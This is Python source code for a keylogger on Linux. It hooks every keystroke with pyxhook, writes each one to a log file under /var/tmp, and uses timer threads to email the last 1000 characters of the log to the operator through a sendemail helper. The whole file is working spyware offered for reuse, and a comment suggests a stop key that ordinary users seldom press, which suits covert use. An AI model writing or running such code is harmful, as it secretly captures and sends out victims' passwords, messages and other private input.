"""
Copyright (c) 2017, uzzal
All rights reserved.
Special thanks to  Aman Deep [https://github.com/hiamandeep], He is first owner of this, because I start writing this from his code.
I rewrite this code for my own use.  Feel free to rewrite and distribute maintaining GNU policy
A simple keylogger witten in python checking the platform
All keystrokes are recorded in a log file.

The program terminates when grave key(`) is pressed

grave key is found below Esc key

Requirement: python-xlib required. you can download and install it from
http://dl.fedoraproject.org/pub/epel/7/x86_64/p/
"""

import pyxhook
import sendemail
import threading
import sys

# change this to your log file's path
# if osplatform.pltfrm == 'Linux' or osplatform.pltfrm == 'MAC OS X':
log_file = '/var/tmp/logger.log'


# elif osplatform.pltfrm == 'Windows':
#   log_file = 'c:\\tmp\logger.log'
# message = "Test Message2"



# OnKeyStrokeEvent is called everytime occurs a key event.
def OnKeyStrokeEvent(event):
    # Write (Append) KeyStrokeEvent into log_file
    logfile = open(log_file, 'a')
    write_keystroke = chr(event.Ascii)
    if event.Ascii == 13:
        write_keystroke = '\n'

    if event.Ascii == 32:
       # schedule_email()
        write_keystroke = ' '
    if event.Ascii == 0: # If key Stroke is NULL
        try:
            threading.Timer(30, schedule_email).start()      # Call a thread here to send shecdule mail at every 30 second
            threading._sleep(15)
            #After Initiate first threading , threading sleep 10 seconds
        except Exception as e:
            print "Error : -"+ e.__str__()



    # else:
    #   threading.Timer(60, schedule_email).start()
    logfile.write(write_keystroke)

    # 96 is the ascii value of the grave key (`), we should use any value that is generally press by a ordinary user
    # If you want to modify or reuse this code, chose this value wisely
    if event.Ascii == 96:
        logfile.close()
        new_hook.cancel()


# Sending Mail
def schedule_email():
    keystroke = open(log_file, 'rb')
    content = keystroke.read()[-1000:]
    keystroke.close()
    sendemail.send_mail(content)


# instantiate HookManager class
new_hook = pyxhook.HookManager()
# listen to all keystrokes
new_hook.KeyDown = OnKeyStrokeEvent
# hook the keyboard
new_hook.HookKeyboard()
# start the session
new_hook.start()
